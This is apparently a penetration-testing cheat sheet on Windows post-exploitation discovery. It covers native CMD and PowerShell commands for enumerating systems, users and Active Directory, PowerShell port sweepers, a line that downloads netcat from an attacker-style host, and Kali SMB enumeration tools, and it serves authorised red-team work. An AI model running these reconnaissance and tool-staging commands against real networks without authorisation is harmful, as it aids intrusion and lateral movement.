# Windows Post Exploitation Discovery

## Description

Techniques and tools for post-exploitation discovery using native Windows tools

* [Background](#background)
* [Techniques](#techniques)
* [Tools]
  * [System Info with CMD](#system-info-with-cmd)
  * [Network/Domain Info with CMD](#networkdomain-info-with-cmd)  
  * [Local User Info with CMD](#local-user-info-with-cmd)
  * [Domain User Info with CMD](#domain-user-info-with-cmd)
  * [Enumerating with PowerShell](#enumerating-with-powershell)
* [Resources]

## Background

Windows post-exploitation techniques during a red-team engagement often involve discovering and leveraging weaknesses in the target environment, such as misconfigurations, unpatched vulnerabilities, or insecure permissions, to further exploit and compromise the system. These discoveries can include locating stored credentials, identifying vulnerable services or applications, enumerating network resources, or discovering ways to move laterally within the network. By leveraging these post-exploitation findings, attackers can extend their control over the compromised system and potentially expand their reach to other interconnected systems within the target environment.

## Techniques

* Identify current user ID and privileges
* Identify network connections (for lateral movement)
* Identify Running processes
* Identify Chron jobs/scheduled tasks
* Identify if Active Directory environment then identify users/groups/computers if in cloud or on-prem
* If not AD, then find applications, firewalls, AV
* Windows CMDs to run on system:
  * whoami
  * tasklist
  * systeminfo
  * <https://github.com/emilyanncr/Windows-Post-Exploitation>
  * systeminfo && whoami /all
  * Shell

## System Info with CMD

| Description                          | Command             | Example                                                                                                          |
|--------------------------------------|---------------------|------------------------------------------------------------------------------------------------------------------|
| System info                          | `systeminfo`        | `systeminfo`                                                                                                     |
| OS Name/Version                      | `systeminfo`        | `systeminfo` &#124; `findstr /B /C:"OS Name" /C:"OS Version`                                                     |
| System drives                        | `wmic logicaldisk`  | `wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber`       |
| Connected Devices                    | `wmic logicaldisk`  | `wmic logicaldisk get caption,description,providername`                                                          |
| System Environment Table             | `set`               | `set`                                                                                                            |
| Running System Processes             | `tasklist`          | `tasklist /v`                                                                                                    |
| Services Running Inside Each Process | `tasklist`          | `tasklist /svc`                                                                                                  |
| Attributes of All Running Processes  | `wmic process list` | `wmic process list full`                                                                                         |
| Started Windows Services             | `net start`         | `net start`                                                                                                      |
| Scheduled Jobs                       | `schtasks`          | `schtasks /query /fo LIST /v`                                                                                    |
| Windows Patches                      | `wmic qfe`          | `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                          |
| Installed Application Names          | `wmic product`      | `wmic product get name`                                                                                          |

## Network/Domain Info with CMD

| Description                         | Command    | Example                                                                                      |
|-------------------------------------|------------|----------------------------------------------------------------------------------------------|
| IP and Interfaces                   | `ipconfig` | `ipconfig /all`                                                                              |
| Copy IP info to clipboard           | `ipconfig` | `ipconfig` &#124; `clip`                                                                     |
| Routing Table                       | `route`    | `route print`                                                                                |
| ARP Table                           | `arp`      | `arp -a`                                                                                     |
| Active TCP Connections              | `netstat`  | `netstat -an`                                                                                |
| TCP and UDP activity every 1 second | `netstat`  | `netstat -naob 1` &#124; `find "<IPADRR or PORT>`                                            |
| Get domain                          | `echo`     | `echo %USERDOMAIN%`                                                                          |
| Domain Logon Server                 | `echo`     | `echo %LOGONSERVER%`                                                                         |
| Domain Password Policy              | `net`      | `net accounts /domain`                                                                       |
| Local Password Policy               | `net`      | `net accounts`                                                                               |
| DC Address, Domain Name, Roles      | `wmic`     | `wmic ntdomain`                                                                              |
| Trusted Domain                      | `dsquery`  | `dsquery * -filter "(objectclass=TrustedDomain)" -attr trustpartner,flatname,trustdirection` |
| Network Shares                      | `net`      | `net share`                                                                                  |
| View All Hosts in Domain/Workgroup  | `net`      | `net view`                                                                                   |
| Domain Trust Info                   | `nltest`   | `nltest /trusted_domains`                                                                    |

## Local User Info with CMD

| Description                  | Command                       | Example                         |
|------------------------------|-------------------------------|---------------------------------|
| Username of Current User     | `whoami` or `echo %USERNAME%` | `whoami`                        |
| All whoami Access Token Info | `whoami`                      | `whoami /all`                   |
| Local Users                  | `net`                         | `net users`                     |
| Detailed User Info           | `net`                         | `net user $USERNAME`            |
| Users with RDP Priv          | `qwinsta`                     | `qwinsta`                       |
| Local Groups                 | `net`                         | `net localgroup`                |
| Local Administrators         | `net`                         | `net localgroup administrators` |

## Domain User Info with CMD

| Description                                  | Command   | Example                                                                                                          |
|----------------------------------------------|-----------|------------------------------------------------------------------------------------------------------------------|
| Domain Groups (run on DC)                    | `net`     | `net user`                                                                                                       |
| Dsquery User List                            | `dsquery` | `dsquery user domainroot`                                                                                        |
| User Logon Name with Email                   | `dsquery` | `dsquery * domainroot -filter   "(&(objectCategory=Person)(objectClass=User)(mail=e-mailaddress))"   -attr name` |
| Domain Admins of with Remote Trused   Domain | `dsquery` | `dsquery * -filter "(cn=Domain Admins)" -attr member -d   trustedDomain`                                         |
| Domain Users                                 | `wmic`    | `wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET   ds_samaccountname`                                     |
| Domain Groups                                | `wmic`    | `wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET   ds_samaccountname`                                    |
| Domain Computers                             | `wmic`    | `wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET   ds_samaccountname`                                 |
| View Domain User Info                        | `net`     | `net user /domain       net user pentestuser /domain`                                                            |
| Domain Admin Users                           | `net`     | `net group “Domain Admins” /domain`                                                                              |

## Enumerating with PowerShell

| Description                              | Cmdlet                | Example                                                                                                                                              |
|------------------------------------------|-----------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| Show SET                                 | `Get-ChildItem`       | `Get-ChildItem Env:` &#124; `ft Key,Value`                                                                                                           |
| Get Connected Drives                     | `Get-PSDrive`         | `Get-PSDrive` &#124; `where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}` &#124; `ft Name,Root`                                        |
| Ping Sweeper                             | `echo`                | `1..255` &#124; `% {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_` &#124; `Select-String ttl}`                                                  |
| Port Sweeper                             | `echo`                | `1..1024` &#124; `% {echo ((new-object   Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_   is open!"} 2>$null`                              |
| Sweep Range of IPs for Single Port       | `Test-NetwConnection` | `foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}`                                                    |
| Sweep IPs and Ports                      | `New-Object`          | `1..20` &#124; `% { $a = $_; 1..1024` &#124; `% {echo ((new-object   Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is   open!"} 2>$null}` |
| Test Egress Filtering                    | `New-Object`          | `1..1024` &#124; `% {echo ((new-object   Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port   $_ is open" } 2>$null`                       |
| Show Domain Admins                       | `ADSI`                | `([adsisearcher]'(memberOf=cn=Domain   Admins,CN=Users,dc=contoso,dc=com)').FindAll()`                                                               |
| Show Accounts that Don't Lock Out        | `dsquery`             | `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"`                                 |
| Web Client to Download Files (eg NetCat) | `wget`                | `wget "http://10.10.10.10/nc.exe" -outfile   "c:\nc.exe"`                                                                                            |
| Get Firewall Rules                       | `Get-NetFirewallRule` | ``Get-NetFirewallRule -all &#124; Out-GridView` or   `Get-NetFirewallRule -all &#124; Export-csv <file_path.csv>``                                   |

## Linux/Kali Tools



 SMB Enumeration Tools
 ```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
```bash
nbtscan 192.168.1.0/24
```

Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
```bash
enum4linux -a target-ip
```

Fingerprint SMB Version
```bash
smbclient -L //192.168.1.100 
```

Find open SMB Shares in Nmap
```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
```

Enumerate SMB Users in Nmap
```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```


Enumerate SMB Using Samrdump Python Impacket

```bash
python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
```


ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
https://github.com/trustedsec/ridenum


Metasploit RID Cycling

```bash
use auxiliary/scanner/smb/smb_lookupsid
```

https://github.com/SecureAuthCorp/impacket

https://www.hackingarticles.in/impacket-guide-smb-msrpc/

 https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/

## Domain Enumeration Resources

* Information dumper via LDAP: https://github.com/dirkjanm/ldapdomaindump
* Integrated DNS dumping by any authenticated user: https://github.com/dirkjanm/adidnsdump
* Advanced Discovery of Privileged Accounts: https://github.com/cyberark/ACLight
* Detailed Active Directory Recon Tool: https://github.com/sense-of-security/ADRecon
* Powershell AD Enumeration: https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf
* Data collector tool: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html



## Resources


For persistence section: https://ss64.com/nt/net-config.html

* A simple batch script with these commands: [\tools\WinNetEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinNetEnum.bat)

* A simple batch script with these commands: [\tools\WinSysEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinSysEnum.bat)

* A simple CMD script that outputs these commands to txt is here: [\tools\WinUserEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinUserEnum.bat)



https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/

